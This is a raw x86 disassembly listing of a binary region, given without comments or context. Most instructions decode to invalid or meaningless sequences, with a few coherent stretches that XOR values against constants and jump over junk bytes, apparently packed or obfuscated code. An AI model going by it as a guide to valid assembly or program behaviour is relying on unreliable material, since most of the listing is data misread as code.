  4112fb:	popa   
  4112fc:	in     al,dx
  4112fd:	pop    ebp
  4112fe:	in     eax,dx
  4112ff:	(bad)  
  411300:	jg     0x4112c1
  411302:	ins    DWORD PTR es:[edi],dx
  411303:	into   
  411304:	cli    
  411305:	in     al,0x33
  411307:	test   al,0xe5
  411309:	inc    ebx
  41130a:	fdiv   DWORD PTR [ecx]
  41130c:	jo     0x4112b3
  41130e:	inc    edi
  41130f:	xor    eax,0x42402747
  411314:	sub    al,0x9
  411316:	inc    eax
  411317:	aad    0x8f
  411319:	or     al,0x62
  41131b:	or     dh,BYTE PTR ds:0xcaaf62f0
  411321:	adc    BYTE PTR [edi+0x5f],bl
  411324:	push   eax
  411325:	fisttp QWORD PTR [esi+eiz*1-0x3c86f2ca]
  41132c:	cdq    
  41132d:	shr    ah,cl
  41132f:	popa   
  411330:	cmp    eax,0x999d579b
  411335:	shr    ah,cl
  411337:	mov    edi,DWORD PTR [eax+0x22]
  41133a:	mov    eax,0x724d233b
  41133f:	push   eax
  411340:	mov    dh,0x60
  411342:	in     al,dx
  411343:	sbb    al,0x19
  411346:	mov    dl,0x74
  411348:	sub    dl,al
  41134a:	data16 fist DWORD PTR [ebx-0x8]
  41134e:	and    ebp,ecx
  411350:	xor    eax,0x6eb1aec0
  411355:	mov    dh,0x80
  411357:	icebp  
  411358:	cmc    
  411359:	gs loope 0x411346
  41135c:	int    0x1e
  41135e:	or     dh,ch
  411360:	sub    esp,DWORD PTR [edi-0x61]
  411363:	cmp    ah,al
  411365:	imul   ebx,esi,0x5
  411368:	mov    bl,0xbd
  41136a:	aaa    
  41136b:	add    BYTE PTR [eax-0x7d],bh
  41136e:	jae    0x41135a
  411370:	xlat   BYTE PTR ds:[ebx]
  411371:	mov    al,ds:0xa8758356
  411376:	mov    ebx,0x91601d08
  41137b:	add    al,0x2d
  41137d:	(bad)  
  41137e:	jmp    0x522f:0xbc477a42
  411385:	pop    es
  411386:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411387:	scas   al,BYTE PTR es:[edi]
  411388:	fsubr  DWORD PTR [eax+ebx*2-0x2b]
  41138c:	dec    esp
  41138d:	sub    al,0xcb
  41138f:	(bad)  
  411390:	adc    BYTE PTR [edi+eax*4-0x44],ah
  411394:	aaa    
  411395:	popf   
  411396:	push   0xffffffdd
  411398:	adc    sp,bp
  41139b:	outs   dx,BYTE PTR ds:[esi]
  41139c:	aaa    
  41139d:	(bad)  
  41139e:	in     al,0x8e
  4113a0:	(bad)  [eax+0xabe8329]
  4113a6:	(bad)  
  4113a7:	out    dx,al
  4113a8:	jns    0x4113fc
  4113aa:	mov    ebx,0xa5cd4cca
  4113af:	popf   
  4113b0:	jg     0x411424
  4113b2:	ins    DWORD PTR es:[edi],dx
  4113b3:	xor    edi,DWORD PTR [ecx-0x3ee28ff5]
  4113b9:	lahf   
  4113ba:	rcl    DWORD PTR [ecx],0x7b
  4113bd:	xchg   ecx,eax
  4113be:	ret    0x3bbc
  4113c1:	int3   
  4113c2:	(bad)  
  4113c3:	pop    esi
  4113c4:	outs   dx,DWORD PTR ds:[esi]
  4113c5:	cmp    eax,0xd7b12be9
  4113ca:	and    BYTE PTR [ebp-0x73a0194b],bh
  4113d0:	push   edx
  4113d1:	mov    esp,0xaf67f6c2
  4113d6:	mov    ecx,0x5a915b9b
  4113db:	mov    ds:0xa046b93f,al
  4113e0:	cmp    al,0x3c
  4113e2:	dec    ecx
  4113e3:	(bad)  
  4113e4:	adc    al,0xbf
  4113e6:	jbe    0x41139f
  4113e8:	adc    dh,BYTE PTR [ebx-0xc]
  4113eb:	or     bh,BYTE PTR [ebx]
  4113ed:	shr    DWORD PTR [eax+0x3133342b],cl
  4113f3:	scas   al,BYTE PTR es:[edi]
  4113f4:	dec    esi
  4113f5:	out    0x83,eax
  4113f7:	push   esp
  4113f8:	ror    DWORD PTR [ecx+0x1be8f327],0x4
  4113ff:	shl    BYTE PTR [edx+eiz*4],1
  411402:	sbb    ah,BYTE PTR [ecx-0x4d7280cb]
  411408:	and    eax,0x975e7dcc
  41140d:	inc    esp
  41140e:	in     al,0x70
  411410:	sub    DWORD PTR ds:0xdc18a678,0xffffff94
  411417:	pop    esi
  411418:	mov    ah,0x77
  41141a:	out    dx,al
  41141b:	arpl   WORD PTR [ebp+0x65c35877],ax
  411421:	enter  0x7ef,0x17
  411425:	fstp   QWORD PTR [ebp-0x7c917a9]
  41142b:	lods   eax,DWORD PTR ds:[esi]
  41142c:	jo     0x4113bd
  41142e:	or     al,0xd9
  411430:	pop    ss
  411431:	and    BYTE PTR [esi-0x2dc45816],bh
  411437:	aas    
  411438:	hlt    
  411439:	retf   
  41143a:	push   ss
  41143b:	xchg   edx,eax
  41143c:	dec    ebx
  41143d:	test   al,0xb5
  41143f:	call   FWORD PTR [edi+0xf]
  411442:	mov    dh,0xa1
  411444:	lods   eax,DWORD PTR ds:[esi]
  411445:	sbb    eax,0xe02e8f22
  41144a:	ss sub al,0x98
  41144d:	aam    0xb8
  41144f:	and    esp,edi
  411451:	shr    BYTE PTR ds:0x5085c7fc,1
  411457:	(bad)  
  411458:	(bad)  
  411459:	jmp    DWORD PTR [ebp+esi*2+0x0]
  41145d:	add    bh,al
  41145f:	test   DWORD PTR [edi+edi*8-0x1],edx
  411463:	dec    edi
  411465:	sbb    BYTE PTR [eax],al
  411467:	add    bh,al
  411469:	test   DWORD PTR [eax-0x1],esp
  41146c:	(bad)  
  41146d:	push   DWORD PTR ds:0xc7000031
  411473:	test   DWORD PTR [edi+edi*8-0x1],esp
  411477:	dec    DWORD PTR [ebp-0x38ffffaa]
  41147d:	test   DWORD PTR [eax-0x1],esi
  411480:	(bad)  
  411481:	push   edx
  411483:	adc    DWORD PTR [eax],eax
  411485:	add    bh,al
  411487:	test   DWORD PTR [edi+edi*8-0x1],esi
  41148b:	(bad)  
  41148c:	jmp    0xf045:0xc7000063
  411493:	data16 xor BYTE PTR [eax],al
  411496:	add    bh,al
  411498:	inc    ebp
  411499:	clc    
  41149a:	shr    BYTE PTR [esi+0x0],cl
  41149d:	add    BYTE PTR [eax+0x1d],ch
  4114a0:	jle    0x4114a2
  4114a2:	add    cl,ch
  4114a4:	jo     0x4114a8
  4114a6:	add    BYTE PTR [eax],al
  4114a8:	dec    edi
  4114a9:	sub    bl,BYTE PTR [edx+0x3b209ab0]
  4114af:	sub    dl,BYTE PTR [eax+0x557e2188]
  4114b5:	sub    DWORD PTR ds:[edx+0x18187847],ebp
  4114bc:	jno    0x4114d2
  4114be:	sbb    BYTE PTR [eax],bl
  4114c0:	rol    ebx,1
  4114c2:	dec    esi
  4114c3:	daa    
  4114c4:	jb     0x411537
  4114c6:	pop    ss
  4114c7:	jle    0x411547
  4114c9:	jne    0x4114c3
  4114cb:	pop    esi
  4114cc:	stos   DWORD PTR es:[edi],eax
  4114cd:	xor    ah,al
  4114cf:	outs   dx,DWORD PTR ds:[esi]
  4114d0:	mov    ds:0x285dcae6,eax
  4114d5:	or     bl,BYTE PTR [esi-0x1e]
  4114d8:	push   ss
  4114d9:	jno    0x4114f3
  4114db:	and    al,0x2d
  4114dd:	nop
  4114de:	(bad)  
  4114df:	arpl   WORD PTR ds:0x2c9f0685,cx
  4114e5:	fs pop ebp
  4114e7:	test   BYTE PTR [ebx+ebp*4],cl
  4114ea:	(bad)  
  4114eb:	sti    
  4114ec:	adc    BYTE PTR [ebx-0x47],ch
  4114ef:	push   0xfffffffd
  4114f1:	pop    esp
  4114f2:	add    esi,DWORD PTR [eax+0x1d761cbb]
  4114f8:	(bad)  
  4114f9:	adc    ecx,ebx
  4114fb:	add    BYTE PTR [ebx],bl
  4114fd:	jmp    0x41156f
  4114ff:	dec    ecx
  411500:	sti    
  411501:	stos   BYTE PTR es:[edi],al
  411502:	or     BYTE PTR [ecx],bh
  411504:	call   0xbe2d:0x109c6040
  41150b:	sbb    ch,BYTE PTR [esi-0x44]
  41150e:	push   eax
  41150f:	(bad)  
  411510:	sub    al,0xc0
  411512:	dec    ecx
  411513:	test   eax,edi
  411515:	inc    ebx
  411516:	pop    ds
  411517:	cli    
  411518:	add    BYTE PTR [esi+0x3fd7f939],0x55
  41151f:	inc    esp
  411520:	xor    BYTE PTR [esi-0x7e],bh
  411523:	pop    edx
  411524:	std    
  411525:	scas   al,BYTE PTR es:[edi]
  411526:	inc    ebx
  411527:	push   eax
  411528:	pop    esi
  411529:	lds    edi,FWORD PTR [ebp-0x7c]
  41152c:	std    
  41152d:	fbstp  TBYTE PTR ds:0xa38cc14b
  411533:	retf   
  411534:	push   eax
  411535:	scas   eax,DWORD PTR es:[edi]
  411536:	inc    edi
  411537:	push   ebx
  411538:	pop    es
  411539:	mov    al,ds:0xe18b5947
  41153e:	pop    edx
  41153f:	jmp    0x6d893879
  411544:	push   ss
  411545:	sbb    ah,ch
  411547:	jge    0x4115b5
  411549:	mov    esi,DWORD PTR [esi-0x1d7a61cb]
  41154f:	jns    0x411539
  411551:	sub    ebx,eax
  411553:	push   es
  411554:	pop    es
  411555:	arpl   WORD PTR [esi+0x21],si
  411558:	cld    
  411559:	and    edi,DWORD PTR [eax]
  41155b:	xor    BYTE PTR [ebx+0x4e],ah
  41155e:	ds loop 0x4115d8
  411561:	xchg   edi,eax
  411562:	dec    edx
  411563:	add    eax,0x9f030825
  411568:	sbb    dl,bl
  41156a:	aaa    
  41156b:	xchg   ebx,eax
  41156c:	and    bl,BYTE PTR [esi+0x28]
  41156f:	ss dec ebp
  411571:	ds nop
  411573:	mov    esi,0x451adfb6
  411578:	ss jmp 0xc85f9f89
  41157e:	add    ebp,DWORD PTR [esi+0x143ad40a]
  411584:	dec    eax
  411585:	fsubr  st(6),st
  411587:	mov    ebp,0x7989f6d4
  41158c:	xor    ebx,DWORD PTR [esi]
  41158e:	imul   ebp,DWORD PTR [eax],0xffffffe6
  411591:	jmp    0x1d1b0af8
  411596:	hlt    
  411597:	adc    al,BYTE PTR [ebx+ecx*4-0x54a5d729]
  41159e:	dec    esp
  41159f:	push   0xfa9bdf70
  4115a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4115a5:	inc    esi
  4115a6:	dec    edi
  4115a7:	jle    0x411606
  4115a9:	aas    
  4115aa:	popa   
  4115ab:	push   0x59071e02
  4115b0:	push   edx
  4115b1:	push   0xf72ddc0f
  4115b6:	fdivp  st(0),st
  4115b8:	ret    
  4115b9:	and    ch,ah
  4115bb:	ror    BYTE PTR [ebp-0x1d],0xd7
  4115bf:	rcl    ebx,cl
  4115c1:	push   ebp
  4115c2:	adc    bh,dl
  4115c4:	arpl   WORD PTR [esi+0x38dc93a9],di
  4115ca:	xor    esp,ebp
  4115cc:	hlt    
  4115cd:	and    dh,bl
  4115cf:	mov    ebp,0x1812c2c9
  4115d4:	jp     0x41159d
  4115d6:	popa   
  4115d7:	retf   0xe6ce
  4115da:	and    eax,0x575add79
  4115df:	sbb    eax,0x24844f89
  4115e4:	shr    edx,cl
  4115e6:	push   cs
  4115e7:	gs scas al,BYTE PTR es:[edi]
  4115e9:	fwait
  4115ea:	add    DWORD PTR [esp+ebx*2],esi
  4115ed:	push   es
  4115ee:	fmul   DWORD PTR [ecx-0x1c]
  4115f1:	pop    esp
  4115f2:	stc    
  4115f3:	pushf  
  4115f4:	cs or  ch,cl
  4115f7:	push   ds
  4115f8:	hlt    
  4115f9:	push   eax
  4115fa:	icebp  
  4115fb:	sub    al,0xe
  4115fd:	jo     0x4115fa
  4115ff:	(bad)  [ebx-0x602f552d]
  411605:	popf   
  411606:	xchg   DWORD PTR [edi],ebp
  411608:	mov    ebx,0xacae9e98
  41160d:	push   0x3c
  41160f:	cmp    DWORD PTR [edi],0x4f
  411612:	(bad)  
  411613:	int    0x60
  411615:	pop    eax
  411616:	sub    DWORD PTR [ebx-0x1c],0xffffff9d
  41161a:	in     eax,dx
  41161b:	xor    BYTE PTR [edx+0x1],0x7e
  41161f:	or     BYTE PTR [eax-0x3cde5e31],0x5a
  411626:	retf   0x55a5
  411629:	ficom  WORD PTR ds:0xe3b6cf56
  41162f:	xor    bl,cl
  411631:	jne    0x411654
  411633:	push   ds
  411634:	cli    
  411635:	push   eax
  411636:	and    eax,0x91a7315b
  41163b:	sbb    eax,0x9de079bb
  411640:	push   eax
  411641:	add    ch,BYTE PTR [esp+edx*4+0x4365927d]
  411648:	jle    0x411636
  41164a:	xchg   esp,eax
  41164b:	jecxz  0x4115e7
  41164d:	push   cs
  41164e:	pop    ecx
  41164f:	inc    ebx
  411650:	push   0xc1c6c960
  411655:	mov    esp,0x589a824d
  41165a:	jecxz  0x41162f
  41165c:	sub    ebp,ebx
  41165e:	push   cs
  41165f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411660:	xchg   edx,eax
  411661:	shr    DWORD PTR [esi],1
  411663:	xchg   ebp,eax
  411664:	xor    edx,edi
  411666:	pop    esp
  411667:	mov    bl,BYTE PTR [ebx-0x6e]
  41166a:	fcomp  QWORD PTR cs:[edi-0xffc6c22]
  411671:	leave  
  411672:	scas   al,BYTE PTR es:[edi]
  411673:	jo     0x411669
  411675:	inc    ecx
  411676:	inc    eax
  411677:	mov    esi,0x4fb7e1fb
  41167c:	jp     0x4116b6
  41167e:	jecxz  0x411621
  411680:	loope  0x411678
  411682:	cmp    BYTE PTR [edx],al
  411684:	add    ch,BYTE PTR [eax]
  411686:	cmp    BYTE PTR [ecx],al
  411688:	mov    ecx,0x3fde3a4f
  41168d:	pop    es
  41168e:	iret   
  41168f:	mov    cl,0xfd
  411691:	cmc    
  411692:	inc    ebp
  411693:	iret   
  411694:	test   al,0x72
  411696:	xor    BYTE PTR [eax+0x6cd5bffe],al
  41169c:	jmp    0x5dfae07e
  4116a1:	scas   al,BYTE PTR es:[edi]
  4116a2:	pop    ss
  4116a3:	xchg   DWORD PTR [eax+eax*1],esi
  4116a6:	mov    eax,DWORD PTR [edx-0x43]
  4116a9:	nop
  4116aa:	icebp  
  4116ab:	mov    al,0xcf
  4116ad:	xchg   esp,eax
  4116ae:	mov    edx,0x16700c69
  4116b3:	in     al,0xaf
  4116b5:	adc    BYTE PTR [ebx],0x34
  4116b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4116b9:	mov    ebp,0xb32986c9
  4116be:	sub    al,0x9a
  4116c0:	test   BYTE PTR [eax],cl
  4116c2:	push   ss
  4116c3:	or     eax,0xa0de3ffb
  4116c8:	adc    dl,BYTE PTR [esi-0x701c0da4]
  4116ce:	jbe    0x41167d
  4116d0:	je     0x41171f
  4116d2:	inc    ecx
  4116d3:	mov    BYTE PTR [edx-0x64],cl
  4116d6:	pop    edi
  4116d7:	sbb    ecx,edx
  4116d9:	test   al,0x87
  4116db:	mov    eax,ds:0xbd3dd465
  4116e0:	pusha  
  4116e1:	int3   
  4116e2:	mov    cs,WORD PTR [edx+0x73232e56]
  4116e8:	sub    eax,0x3af38f1e
  4116ed:	mov    edi,0xcc1a790e
  4116f2:	and    DWORD PTR ds:0xd3070453,ecx
  4116f8:	shr    BYTE PTR [esi],cl
  4116fa:	popa   
  4116fb:	mov    es,eax
  4116fd:	jl     0x41170a
  4116ff:	xlat   BYTE PTR ds:[ebx]
  411700:	inc    esp
  411701:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411702:	mov    eax,ds:0xa847582
  411707:	out    dx,al
  411708:	sbb    eax,0xaea5c5ed
  41170d:	cld    
  41170e:	pop    ecx
  41170f:	jmp    0x56f:0xd818dc7b
  411716:	push   edx
  411717:	push   ss
  411718:	mov    DWORD PTR [ebp-0x4],0x30f4
  41171f:	mov    eax,DWORD PTR [ebp-0x20]
  411722:	mov    ecx,DWORD PTR [ebp-0x1c]
  411725:	push   0x5380
  41172a:	push   ecx
  41172b:	push   eax
  41172c:	call   0x416c20
  411731:	mov    ecx,eax
  411733:	mov    eax,DWORD PTR [ebp-0x30]
  411736:	xor    ecx,eax
  411738:	mov    esi,edx
  41173a:	mov    edx,DWORD PTR [ebp-0x2c]
  41173d:	mov    eax,DWORD PTR [ebp-0x40]
  411740:	xor    esi,edx
  411742:	jmp    0x4119b7
  411747:	lds    edi,FWORD PTR [ecx]
  411749:	fisubr WORD PTR [ebp+0x5a]
  41174c:	sbb    al,BYTE PTR [edx+0x21]
  41174f:	pusha  
  411750:	mov    al,ds:0x34c2aa57
  411755:	pop    edi
  411756:	jo     0x4116f6
  411758:	je     0x411772
  41175a:	sbb    BYTE PTR [ecx+0x14],dh
  41175d:	sbb    BYTE PTR [eax],bl
  41175f:	push   ss
  411760:	jno    0x411799
  411762:	cs in  al,dx
  411764:	data16 adc BYTE PTR [ecx],0x1
  411768:	sbb    WORD PTR [esi-0x1f],0x57
  41176d:	cmp    BYTE PTR [edx],ch
  41176f:	add    eax,0x590165c0
  411774:	sub    eax,0x955f38c3
  411779:	rcl    DWORD PTR [ebx+ecx*2],1
  41177c:	adc    esp,ebp
  41177e:	push   edi
  41177f:	dec    edi
  411780:	jbe    0x41173e
  411782:	(bad)
  411787:	add    dl,BYTE PTR [eax]
  411789:	stc    
  41178a:	out    dx,eax
  41178b:	or     dl,BYTE PTR [ebp+0x2fe34f9c]
  411791:	pop    ds
  411792:	sbb    edi,edx
  411794:	dec    eax
  411795:	jo     0x411759
  411797:	nop
  411798:	movd   mm3,esi
  41179b:	or     al,0xb
  41179d:	inc    esp
  41179e:	outs   dx,DWORD PTR ds:[esi]
  41179f:	pushf  
  4117a0:	mov    bl,0xab
  4117a2:	cmp    eax,0x9a168014
  4117a7:	bound  ecx,QWORD PTR [edx+0x696cad55]
  4117ad:	outs   dx,DWORD PTR ds:[esi]
  4117ae:	mov    esp,0x523b6c80
  4117b3:	shl    DWORD PTR es:[eax+0x47cf3d31],0x3a
  4117bb:	popf   
  4117bc:	sbb    eax,0xf78e3b36
  4117c1:	arpl   WORD PTR [esi],si
  4117c3:	cwde   
  4117c4:	in     eax,dx
  4117c5:	cmp    ebx,DWORD PTR [edi]
  4117c7:	sub    ah,BYTE PTR [esi-0x5484230e]
  4117cd:	mov    ah,0x80
  4117cf:	push   eax
  4117d0:	pusha  
  4117d1:	xchg   esi,eax
  4117d2:	cwde   
  4117d3:	add    esp,esi
  4117d5:	mov    dl,0xe2
  4117d7:	jb     0x411791
  4117d9:	imul   esi,ecx,0xffffff9d
  4117dc:	dec    edi
  4117dd:	jns    0x411786
  4117df:	(bad)  gs:[edi]
  4117e3:	cdq    
  4117e4:	pop    ss
  4117e5:	aam    0xdb
  4117e7:	stos   BYTE PTR es:[edi],al
  4117e8:	test   dl,bh
  4117ea:	fs sub al,0x81
  4117ed:	mov    eax,ds:0xad036301
  4117f2:	mov    ch,0x18
  4117f4:	retf   0xad8b
  4117f7:	jne    0x41180f
  4117f9:	fisubr WORD PTR [ebx+edi*4-0x1a8575f6]
  411800:	(bad)  
  411801:	fistp  DWORD PTR [esi+0x3b6385bc]
  411807:	int    0xf5
  411809:	and    eax,0x514ee695
  41180e:	push   ss
  41180f:	cmp    bl,bl
  411811:	sub    al,0xe6
  411813:	xor    DWORD PTR [edi],esi
  411815:	sub    BYTE PTR [ebx-0x57],bl
  411818:	inc    esi
  411819:	inc    esi
  41181a:	pop    edx
  41181b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41181c:	rcr    DWORD PTR [edi+0x3e08751c],0x94
  411823:	cmp    eax,0x121a8632
  411828:	idiv   eax
  41182a:	jl     0x411866
  41182c:	aaa    
  41182d:	les    ebp,FWORD PTR [ebx]
  41182f:	aam    0x74
  411831:	xchg   ecx,eax
  411832:	ins    DWORD PTR es:[edi],dx
  411833:	inc    esi
  411834:	mov    bl,0x91
  411836:	cwde   
  411837:	mov    dl,BYTE PTR [edx-0x4ecd8a31]
  41183d:	ret    
  41183e:	fdivr  QWORD PTR [ebp-0x46]
  411841:	hlt    
  411842:	sahf   
  411843:	xchg   edx,eax
  411844:	sbb    eax,0xa38880f1
  411849:	dec    esi
  41184a:	jge    0x411883
  41184c:	enter  0x8e05,0x18
  411850:	dec    esp
  411851:	sub    ebx,ecx
  411853:	pop    ds
  411854:	pop    edx
  411855:	mov    ebp,0x42bb640a
  41185a:	sbb    dh,BYTE PTR [ecx-0x3f]
  41185d:	mov    cl,0x86
  41185f:	cmp    edx,DWORD PTR ds:0x6b9ae94d
  411865:	ins    BYTE PTR es:[edi],dx
  411866:	sbb    eax,0xb0c244ee
  41186b:	fist   WORD PTR [edi]
  41186d:	ss psrld mm3,QWORD PTR es:[edi+0x3a]
  411873:	cdq    
  411874:	or     ch,cl
  411876:	xor    BYTE PTR [edi+esi*2+0x25c2a43c],bh
  41187d:	frstor ss:[ecx+0x41]
  411881:	ret    0x263a
  411884:	or     BYTE PTR [eax],0xdd
  411887:	or     DWORD PTR [edi],ebp
  411889:	mov    ?,esi
  41188b:	xchg   ebp,eax
  41188c:	pushf  
  41188d:	sbb    BYTE PTR ds:0xab2ba09e,dl
  411893:	jl     0x4118ca
  411895:	ds shr edx,0x3e
  411899:	add    ch,BYTE PTR [edi+0x4f]
  41189c:	xor    DWORD PTR [edi],0xffffffd9
  41189f:	call   0x8422:0x39d57426
  4118a6:	out    dx,eax
  4118a7:	ret    0x38e
  4118aa:	dec    edx
  4118ab:	push   esp
  4118ac:	xor    eax,0x7ee51755
  4118b1:	inc    esp
  4118b2:	ss int3 
  4118b4:	shl    BYTE PTR [ecx-0x1a0705d6],cl
  4118ba:	ja     0x411897
  4118bc:	push   es
  4118bd:	or     al,BYTE PTR [eax]
  4118bf:	call   0xf409b341
  4118c4:	or     edx,ebp
  4118c6:	push   ebp
  4118c7:	rol    edx,0x5
  4118ca:	fldcw  WORD PTR ds:0xb94c01eb
  4118d0:	pop    es
  4118d1:	cld    
  4118d2:	cwde   
  4118d3:	int3   
  4118d4:	pop    ebp
  4118d5:	mov    dh,0x6c
  4118d7:	and    eax,0x2e0801c
  4118dc:	out    dx,al
  4118dd:	fnstcw WORD PTR [esi+0x16c18225]
  4118e3:	popf   
  4118e4:	adc    al,0x48
  4118e6:	sub    al,0x32
  4118e8:	mov    ch,0x7e
  4118ea:	xchg   BYTE PTR ds:0x141d8996,dh
  4118f0:	sbb    eax,DWORD PTR [ecx-0x475ac3da]
  4118f6:	mov    gs,WORD PTR [ebp+0x3f]
  4118f9:	mov    bh,0x6e
  4118fb:	(bad)  
  4118fc:	mov    edx,DWORD PTR [eax-0x10]
  4118ff:	mov    dl,0x59
  411901:	gs je  0x411940
  411904:	jmp    0x4118d3
  411906:	ret    
  411907:	jle    0x411941
  411909:	push   es
  41190a:	aam    0x3d
  41190c:	gs clc 
  41190e:	xor    DWORD PTR [edi-0xa],eax
  411911:	retf   
  411912:	dec    esi
  411913:	mov    dl,0x9a
  411915:	repz popaw 
  411918:	mov    BYTE PTR [ecx+ebx*4+0x78],ch
  41191c:	xor    al,0x46
  41191e:	jo     0x4118a6
  411920:	and    eax,0xa91946a5
  411925:	push   ecx
  411926:	loopne 0x411932
  411928:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411929:	je     0x411905
  41192b:	loope  0x4118ff
  41192d:	stos   BYTE PTR es:[edi],al
  41192e:	adc    eax,0xbc662095
  411933:	aas    
  411934:	dec    edi
  411935:	push   ds
  411936:	fisub  WORD PTR [esi-0x6b]
  411939:	or     ecx,DWORD PTR [edx]
  41193b:	in     eax,0xf2
  41193d:	pusha  
  41193e:	mov    cl,BYTE PTR [ebx+0x36]
  411941:	ret    
  411942:	cwde   
  411943:	jle    0x4119af
  411945:	mov    bl,0x14
  411947:	aam    0x45
  411949:	sub    dl,BYTE PTR [ecx-0x95bbfa0]
  41194f:	sbb    eax,0xf86a952e
  411954:	adc    DWORD PTR [esp+eax*1-0x56],eax
  411958:	mov    dh,0x68
  41195a:	btc    DWORD PTR [ebp+0x795cbc94],edx
  411961:	sahf   
  411962:	mov    al,ds:0x13b37b66
  411967:	test   BYTE PTR [edx-0x19270ce9],dl
  41196d:	push   DWORD PTR [eax-0x21e2cc11]
  411973:	mov    edi,0xff904f04
  411978:	inc    BYTE PTR [ebx-0x42]
  41197b:	jns    0x41195f
  41197d:	and    al,0xf
  41197f:	loop   0x4119ce
  411981:	dec    esp
  411982:	bound  ebx,QWORD PTR [ebx+0x3d059561]
  411988:	int3   
  411989:	add    al,0xb6
  41198b:	mov    edx,0x408046ba
  411990:	scas   eax,DWORD PTR es:[edi]
  411991:	pushf  
  411992:	arpl   cx,di
  411994:	cmp    ch,BYTE PTR [eax-0x53ed89f1]
  41199a:	lds    edi,FWORD PTR [eax+0x4f]
  41199d:	push   edx
  41199e:	mov    WORD PTR [esi],ss
  4119a0:	pop    eax
  4119a2:	cmp    ebx,DWORD PTR [edx+0x1d4d1dfd]
  4119a8:	inc    esp
  4119a9:	xchg   edx,eax
  4119aa:	mov    ah,0x9c
  4119ac:	data16 and BYTE PTR [eax],0x24
  4119b0:	js     0x411a2c
  4119b2:	stc    
  4119b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4119b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4119b5:	lock pop ebp
  4119b7:	mov    edx,DWORD PTR [ebp-0x3c]
  4119ba:	xor    ecx,0xf3a
  4119c0:	or     ecx,eax
  4119c2:	mov    eax,ds:0x422568
  4119c7:	mov    eax,DWORD PTR [eax+0x1d8]
  4119cd:	mov    eax,DWORD PTR [eax]
  4119cf:	xor    esi,0x6665
  4119d5:	or     esi,edx
  4119d7:	add    ecx,0xef6a96a5
  4119dd:	cdq    
  4119de:	adc    esi,0xc8b6a000
  4119e4:	cmp    eax,ecx
  4119e6:	jne    0x4119f4
  4119ec:	cmp    edx,esi
  4119ee:	je     0x411f3d
  4119f4:	mov    eax,DWORD PTR [ebp-0x50]
  4119f7:	jmp    0x411c6c
  4119fc:	loope  0x4119a1
  4119fe:	lods   eax,DWORD PTR ds:[esi]
  4119ff:	aam    0xab
  411a01:	mov    edx,0xd9d49ae0
  411a06:	gs mov esp,0x6af650f9
  411a0c:	imul   BYTE PTR [esi+0x18]
  411a0f:	sbb    BYTE PTR [ecx+0x14],dh
  411a12:	sbb    BYTE PTR [eax],bl
  411a14:	add    BYTE PTR ds:[edi-0xf721ed8],dl
  411a1b:	cmc    
  411a1c:	sbb    DWORD PTR [esi],esp
  411a1e:	retf   0x125
  411a21:	xchg   esp,eax
  411a22:	scas   eax,DWORD PTR es:[edi]
  411a23:	mul    DWORD PTR [eax]
  411a25:	jns    0x411a63
  411a27:	fdivr  DWORD PTR [edi]
  411a29:	xchg   edi,eax
  411a2a:	add    ebp,esi
  411a2c:	mov    ecx,0xc60c178f
  411a31:	pop    edx
  411a32:	mov    eax,0xd35990a9
  411a37:	fbld   TBYTE PTR [ebx]
  411a39:	(bad)  
  411a3a:	enter  0x7f3e,0x5b
  411a3e:	rcr    DWORD PTR [edi+ebx*2-0x38],0x22
  411a43:	or     ah,BYTE PTR [bx]
  411a46:	mov    ah,BYTE PTR [eax+0xf]
  411a49:	jb     0x4119df
  411a4b:	pop    ebp
  411a4c:	sbb    DWORD PTR [ecx-0x77],0x78
  411a50:	arpl   WORD PTR [edx+0x37cbb288],sp
  411a56:	sub    dl,BYTE PTR [edi+0x4c12ebd4]
  411a5c:	cwde   
  411a5d:	in     al,0xeb
  411a5f:	rol    BYTE PTR [edx+0x249c12ca],cl
  411a65:	jg     0x411a2f
  411a67:	dec    edx
  411a68:	mov    al,ds:0x55c68bc1
  411a6d:	in     al,0x15
  411a6f:	adc    esp,edi
  411a71:	pop    DWORD PTR [ebp-0x70]
  411a74:	adc    al,0x55
  411a76:	xor    eax,0x7a396823
  411a7b:	inc    eax
  411a7c:	push   0x9525c67a
  411a81:	adc    eax,0xcccb96dd
  411a86:	pop    ecx
  411a87:	test   DWORD PTR [ebp+eiz*4-0x227331de],esi
  411a8e:	xor    BYTE PTR [edi],cl
  411a90:	(bad)  
  411a91:	and    dh,BYTE PTR [edx]
  411a93:	dec    esi
  411a94:	scas   eax,DWORD PTR es:[edi]
  411a95:	ret    0x5201
  411a98:	push   ecx
  411a99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a9a:	xor    al,0x6e
  411a9c:	bound  esi,QWORD PTR [ebp+0x51c33b01]
  411aa2:	sub    eax,0xd2ee074c
  411aa7:	lds    ebx,FWORD PTR [edi+0x61]
  411aaa:	clc    
  411aab:	repnz int 0x65
  411aae:	add    eax,0xf3c0da68
  411ab3:	call   0x6588e63c
  411ab8:	jmp    0x21cd:0xbd821f5b
  411abf:	jmp    0x411a5c
  411ac1:	retf   0xb2af
  411ac4:	jne    0x411b43
  411ac6:	shl    DWORD PTR [ebx-0x1a3946e9],1
  411acc:	sub    ebx,DWORD PTR [ebp+0xa]
  411acf:	or     al,0x37
  411ad1:	xor    esp,DWORD PTR [edx+0x54]
  411ad4:	test   DWORD PTR [ecx+0x675882ed],ebx
  411ada:	inc    ebx
  411adb:	sub    eax,0xec4bcad1
  411ae0:	jge    0x411adf
  411ae2:	fdiv   QWORD PTR [eax]
  411ae4:	xchg   bh,dl
  411ae6:	dec    edi
  411ae7:	adc    al,BYTE PTR [ecx-0x7be3379e]
  411aed:	mov    esp,0xeba5f9b5
  411af2:	and    edi,eax
  411af4:	enter  0x99b1,0x9c
  411af8:	(bad)  
  411af9:	lds    ebx,FWORD PTR [eax+0x79c0a173]
  411aff:	inc    esp
  411b00:	dec    ebx
  411b01:	pop    ecx
  411b02:	div    eax
  411b04:	lock lods al,BYTE PTR ds:[esi]
  411b06:	pop    esi
  411b07:	xor    DWORD PTR ds:0x7a6ec131,0x19
  411b0e:	jle    0x411b34
  411b10:	clc    
  411b11:	mov    ecx,eax
